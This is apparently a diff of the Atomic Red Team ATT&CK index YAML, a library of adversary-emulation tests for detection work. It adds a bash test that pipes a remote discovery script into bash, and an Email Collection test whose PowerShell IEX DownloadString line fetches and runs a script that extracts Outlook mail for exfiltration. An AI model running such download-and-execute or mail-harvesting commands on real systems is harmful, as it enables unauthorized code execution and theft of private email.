@@ -18309,19 +18309,18 @@ collection:
       created: '2017-05-31T21:30:58.938Z'
       identifier: T1074
     atomic_tests:
-    - name: Stage data from Discovery.bat
-      description: 'Utilize powershell to download discovery.bat and save to a local
-        file
+    - name: Stage data from Discovery.sh
+      description: 'Utilize curl to download discovery.sh and execute a basic information
+        gathering shell script
 
 '
       supported_platforms:
-      - windows
+      - linux
+      - macos
       executor:
-        name: powershell
-        command: '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')"
-          > c:\windows\pi.log
-
-'
+        name: bash
+        command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
+          | bash -s > /tmp/discovery.log
   '':
     technique:
       id: attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf
@@ -18365,6 +18364,65 @@ collection:
       modified: '2018-10-17T00:14:20.652Z'
       created: '2017-05-31T21:31:37.917Z'
     atomic_tests: []
+  T1114:
+    technique:
+      id: attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Email Collection
+      description: |-
+        Adversaries may target user email to collect sensitive information from a target.
+
+        Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.
+
+        Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.
+
+        Some adversaries may acquire user credentials and access externally facing webmail applications, such as Outlook Web Access.
+      external_references:
+      - external_id: T1114
+        url: https://attack.mitre.org/techniques/T1114
+        source_name: mitre-attack
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - Authentication logs
+      - File monitoring
+      - Process monitoring
+      - Process use of network
+      x_mitre_detection: |-
+        There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.
+
+        File access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.
+
+        Monitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: collection
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:31:25.454Z'
+      identifier: T1114
+    atomic_tests:
+    - name: T1114 Email Collection with PowerShell
+      description: 'Search through local Outlook installation, extract mail, compress
+        the contents, and saves everything to a directory for later exfiltration.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: |
+          Display email contents in the terminal
+            PS C:\> .\Get-Inbox.ps1
+
+          Write emails out to a CSV
+            PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
+
+          Download and Execute
+            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Get-Inbox.ps1')"
   T1056:
     technique:
       id: attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2
